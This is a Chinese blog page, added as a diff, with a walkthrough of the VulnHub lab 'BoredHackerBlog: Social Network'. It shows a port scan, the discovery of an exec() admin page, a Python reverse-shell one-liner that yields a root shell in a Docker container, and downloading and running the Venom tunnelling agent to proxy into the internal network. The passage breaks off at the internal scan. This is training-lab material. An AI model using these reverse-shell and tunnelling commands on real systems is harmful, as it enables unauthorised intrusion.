@@ -1,0 +1,664 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>BoredHackerBlog：Social Network - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="BoredHackerBlog：Social Network">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-01 00:00" pubdate>
+        2022年7月1日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      127
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BoredHackerBlog：Social Network</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x0F-BoredHackerBlog-Social-Network-vulnhub"><a href="#0x0F-BoredHackerBlog-Social-Network-vulnhub" class="headerlink" title="0x0F BoredHackerBlog: Social Network~vulnhub"></a>0x0F BoredHackerBlog: Social Network~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/">BoredHackerBlog: Social Network ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.151</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.151</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>端口扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.151</span>  <br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 05:10 EDT<br>Nmap scan report for 192.168.135.151<br>Host is up (0.00082s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 cc:53:20:b8:10:db:52:5f:16:02:bc:ee:57:22:80:e1 (DSA)<br>|   2048 01:50:f6:1f:32:e8:0d:fc:48:38:3e:c8:1b:ac:20:02 (RSA)<br>|   256 3b:ae:9a:bd:cb:ff:8f:54:64:32:ec:bf:38:fd:fe:6b (ECDSA)<br>|_  256 77:4e:8b:20:73:52:a4:ee:93:1d:b3:85:f2:25:d7:55 (ED25519)<br>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)<br>|_http-server-header: Werkzeug/0.14.1 Python/2.7.15<br>|_http-title: Leave a message<br>MAC Address: 00:0C:29:A9:17:61 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.82 ms 192.168.135.151<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>其他</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)</td>
+</tr>
+<tr>
+<td>5000/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Werkzeug httpd 0.14.1 (Python 2.7.15)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>5000端口</strong></p>
+<p>访问发现是个留言网站，尝试 SSTI（模板注入），输入了 <code>&#123;&#123;2*2&#125;&#125;</code> 发现不生效 。</p>
+<p>进行目录爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.151:5000</span><br>-----------------<br>URL_BASE: http://192.168.135.151:5000/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>---- Scanning URL: http://192.168.135.151:5000/ ----<br>+ http://192.168.135.151:5000/admin (CODE:200|SIZE:401)<br></code></pre></td></tr></table></figure>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>访问 <code>http://192.168.135.151:5000/admin</code> ，感觉好像可以执行代码：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Admin page<br>Code testing page<br>Status:<br>Nothing was ran. Input some code to exec()<br><br><span class="hljs-section">Code input:</span><br><span class="hljs-section">----------</span><br><span class="hljs-section">Test code</span><br><span class="hljs-section">----------</span><br><span class="hljs-code"> _________________</span><br><span class="hljs-code"> Enter code here</span><br><span class="hljs-code"> _________________</span><br></code></pre></td></tr></table></figure>
+<p>尝试 python 反弹 shell ：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum* (ywhack.com)</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 不可</span><br>import socket,subprocess,os;s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span> | md5sum</span><br>fd0d94202670c274cffc4fad433de106  -<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span> | md5sum</span><br>58a4412023c9b9c631546c19bc4f6c0c  -<br></code></pre></td></tr></table></figure>
+<p>nc 监听，成功反弹：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.151] 53558<br>/app # whoami<br>root<br>/app # id<br>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)<br>/app # ls -l<br>total 16<br>-rw-r--r--    1 root     root           182 Oct 29  2018 Dockerfile<br>-rw-r--r--    1 root     root          1326 Oct 29  2018 main.py<br>-rw-r--r--    1 root     root             6 Oct 28  2018 requirements.txt<br>drwxr-xr-x    2 root     root          4096 Oct 29  2018 templates<br></code></pre></td></tr></table></figure>
+<p>这个时候，首先发现得到的 shell 的行头是：/app #，查看当前目录的文件时发现了 Dockerfile，让人怀疑自己是在 docker 里面。</p>
+<blockquote>
+<p>方法1：如果根目录下存在 dockerenv，那么有极大的概率，我们是在 docker 环境中<br>方法2：查看 ip，如果 ip 与网站 ip 不同，那么有极大的概率，我们是在 docker 环境中<br>方法3：如果 /proc/1/cgroup 文件里面可以看到 docker，以及 docker 的 hash 值。那么我们一定在 docker 环境中。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # ls /.dockerenv<br>/.dockerenv<br>/app # ip addr<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN <br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>6: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP <br>    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>/app # ifconfig     <br>eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:03  <br>          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:26237 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:25914 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:2396416 (2.2 MiB)  TX bytes:3539722 (3.3 MiB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          UP LOOPBACK RUNNING  MTU:65536  Metric:1<br>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)<br><br>/app # cat /proc/1/cgroup<br>11:hugetlb:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>10:perf_event:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>9:blkio:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>8:freezer:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>7:devices:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>6:memory:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>5:cpuacct:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>4:cpu:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>3:cpuset:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>2:name=systemd:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>/app # <br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1c818749e5b7">No.1：vulhub blog-social-network - 简书 (jianshu.com)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/125318405">Vulnhub靶机：BOREDHACKERBLOG: SOCIAL NETWORK_lainwith的博客-CSDN博客</a></p>
+</blockquote>
+<h3 id="1、内网渗透"><a href="#1、内网渗透" class="headerlink" title="1、内网渗透"></a>1、内网渗透</h3><ul>
+<li>基本原理：使用代理工具，建立 kali 与内网机器的一条隧道，将 kali 与内网机器打通，kali 中的工具可以通过该隧道进行工作。</li>
+<li>Vemon 基本步骤：<ul>
+<li>将 agent 拷贝到目标主机，赋予可执行权限</li>
+<li>开启 vemon 服务端：<code>./admin_linux_x64 -lport 9999</code></li>
+<li>开启 vemon 客户端：<code>./a -rhost 192.168.135.1041 -rport 9999</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # for i in $(seq 1 4); do ping -c 1 172.17.0.$i; done<br>PING 172.17.0.1 (172.17.0.1): 56 data bytes<br>64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.631 ms<br><br>--- 172.17.0.1 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.631/0.631/0.631 ms<br>PING 172.17.0.2 (172.17.0.2): 56 data bytes<br>64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.507 ms<br><br>--- 172.17.0.2 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.507/0.507/0.507 ms<br>PING 172.17.0.3 (172.17.0.3): 56 data bytes<br>64 bytes from 172.17.0.3: seq=0 ttl=64 time=0.025 ms<br><br>--- 172.17.0.3 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.025/0.025/0.025 ms<br>PING 172.17.0.4 (172.17.0.4): 56 data bytes<br><br><br>--- 172.17.0.4 ping statistics ---<br>1 packets transmitted, 0 packets received, 100% packet loss<br></code></pre></td></tr></table></figure>
+<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>通过 ping 命令，发现内网中存在别的主机，如果我想探测内网的实际情况，包括存活主机有哪些、分别开放了哪些端口，那么就必须穿透内网，才能实现内网探测。</p>
+<p>内网穿透可选的工具有很多，这里我采用 Venom，你可以在它的 github 主页看到中文使用指南：<a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p>
+<p><strong>1、判断靶机位数</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # uname -a<br>Linux dbca22cf339d 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 Linux<br></code></pre></td></tr></table></figure>
+<p>得知目标是 64 位系统 。</p>
+<p><strong>2、投递 venom</strong></p>
+<p>在 kali 上面使用 python 开启一个 HTTP 服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span>      <br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [01/Jul/2022 21:40:58] &quot;GET /tools/Venom/agent_linux_x64 HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure>
+<p>靶机使用 wget 命令下载代理工具：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # wget http://192.168.135.141:8888/tools/Venom/agent_linux_x64<br>Connecting to 192.168.135.141:8888 (192.168.135.141:8888)<br>agent_linux_x64      100% |*******************************|  3791k  0:00:00 ETA<br></code></pre></td></tr></table></figure>
+<p><strong>3、运行 venom</strong></p>
+<p>kali 开启监听，等待目标的容器系统跟 kali 建立连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./admin_linux_x64 -lport 9999</span><br>Venom Admin Node Start...<br><br>  ____   ____  &#123; v1.1  author: Dlive &#125;<br>  \   \ /   /____   ____   ____   _____<br>   \   Y   // __ \ /    \ /    \ /     \<br>    \     /\  ___/|   |  (  &lt;_&gt; )  Y Y  \<br>     \___/  \___  &gt;___|  /\____/|__|_|  /<br>                \/     \/             \/<br><br>(admin node) &gt;&gt;&gt; <br></code></pre></td></tr></table></figure>
+<p>靶机运行代理工具：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # chmod +x agent_linux_x64<br>/app # ./agent_linux_x64 -rhost 192.168.135.141 -rport 9999<br>2022/07/02 09:45:31 [+]Successfully connects to a new node<br></code></pre></td></tr></table></figure>
+<p>kali 连接成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./admin_linux_x64 -lport 9999</span><br>Venom Admin Node Start...<br><br>  ____   ____  &#123; v1.1  author: Dlive &#125;<br>  \   \ /   /____   ____   ____   _____<br>   \   Y   // __ \ /    \ /    \ /     \<br>    \     /\  ___/|   |  (  &lt;_&gt; )  Y Y  \<br>     \___/  \___  &gt;___|  /\____/|__|_|  /<br>                \/     \/             \/<br><br>(admin node) &gt;&gt;&gt; <br>[+]Remote connection:  192.168.135.151:35936<br>[+]A new node connect to admin node success<br>(admin node) &gt;&gt;&gt; show		# show 显示网络拓扑,下面的拓扑图表示，admin 节点下连接了 1 节点<br>A							# A 表示 admin 节点<br>+ -- 1						# 数字表示 agent 节点<br>(admin node) &gt;&gt;&gt; goto 1		# goto 操作某节点<br>node 1<br>(node 1) &gt;&gt;&gt; socks 1080		# socks 建立到某节点的 socks5 代理<br>a socks5 proxy of the target node has started up on the local port 1080.<br>(node 1) &gt;&gt;&gt; <br></code></pre></td></tr></table></figure>
+<p>执行成功 socks 命令之后，会在 admin 节点本地开启一个端口，通过 1080 端口即可进行 socks5 代理</p>
+<p><strong>4、配置socks代理</strong></p>
+<p>虽然我们建立到某节点的 socks5 代理，我们还需要 proxychains4 来挂载这个代理，才能让 nmap 等工具可以使用该代理去攻击目标。</p>
+<p>配置 proxychains4.conf ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo vi /etc/proxychains4.conf</span>        <br>[sudo] password for kali: <br><span class="hljs-meta">#</span><span class="bash"> socks5 127.0.0.1 1080</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> tail -5 /etc/proxychains4.conf</span> <br><span class="hljs-meta">#</span><span class="bash"> add proxy here ...</span><br><span class="hljs-meta">#</span><span class="bash"> meanwile</span><br><span class="hljs-meta">#</span><span class="bash"> defaults <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;tor&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> socks4        127.0.0.1 9050</span><br>socks5 127.0.0.1 1080<br></code></pre></td></tr></table></figure>
+<h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><p>在上文使用 ping 命令做了内网主机发现，当时发现 172.17.0.1 是存活主机。借鉴在 vmware 虚拟网络中，x.x.x.1 往往代表着宿主机，这里先对 172.17.0.1 进行测试，看看它身上有没有什么有价值的信息。</p>
+<p><strong>使用 nmap 扫描内网地址：</strong></p>
